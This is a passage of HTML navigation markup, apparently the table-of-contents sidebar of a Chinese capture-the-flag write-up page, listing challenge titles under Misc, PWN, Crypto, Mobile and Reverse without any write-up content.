今晚月色美吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-聋子听声音"><span class="nav-number">1.2.4.</span> <span class="nav-text">0x04 聋子听声音</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-二进制"><span class="nav-number">1.2.5.</span> <span class="nav-text">0x05 二进制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-奇怪的压缩文件"><span class="nav-number">1.2.6.</span> <span class="nav-text">0x06 奇怪的压缩文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-zip"><span class="nav-number">1.2.7.</span> <span class="nav-text">0x07 zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-猜拳"><span class="nav-number">1.2.8.</span> <span class="nav-text">0x08 猜拳</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.3.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Simple-nc"><span class="nav-number">1.3.1.</span> <span class="nav-text">0x01 Simple nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-StackOverflow"><span class="nav-number">1.3.2.</span> <span class="nav-text">0x02 StackOverflow</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Base"><span class="nav-number">1.4.1.</span> <span class="nav-text">0x01 Base</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-诡异的数字"><span class="nav-number">1.4.2.</span> <span class="nav-text">0x02 诡异的数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-九宫格"><span class="nav-number">1.4.3.</span> <span class="nav-text">0x03 九宫格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-键盘追踪"><span class="nav-number">1.4.4.</span> <span class="nav-text">0x04 键盘追踪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-宇宙终极问题"><span class="nav-number">1.4.5.</span> <span class="nav-text">0x05 宇宙终极问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-秘密报文"><span class="nav-number">1.4.6.</span> <span class="nav-text">0x06 秘密报文</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-ok"><span class="nav-number">1.4.7.</span> <span class="nav-text">0x07 ok?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-什么密码？"><span class="nav-number">1.4.8.</span> <span class="nav-text">0x08 什么密码？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-Mix"><span class="nav-number">1.4.9.</span> <span class="nav-text">0x09 Mix</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mobile"><span class="nav-number">1.5.</span> <span class="nav-text">Mobile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-apk1"><span class="nav-number">1.5.1.</span> <span class="nav-text">0x01 apk1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-apk2"><span class="nav-number">1.5.2.</span> <span class="nav-text">0x02 apk2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-apk3"><span class="nav-number">1.5.3.</span> <span class="nav-text">0x03 apk3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-FuckAPP"><span class="nav-number">1.5.4.</span> <span class="nav-text">0x04 FuckAPP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">1.6.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Java-jar"><span class="nav-number">1.6.1.</span> <span class="nav-text">0x01 Java jar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-C"><span class="nav-number">1.6.2.</span> <span class="nav-text">0x02 C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Rust"><span class="nav-number">1.6.3.</span> <span class="nav-text">0x03 Rust</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-EasyCrackMe"><span class="nav-number">1.6.4.</span> <span class="nav-text">0x04 EasyCrackMe</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
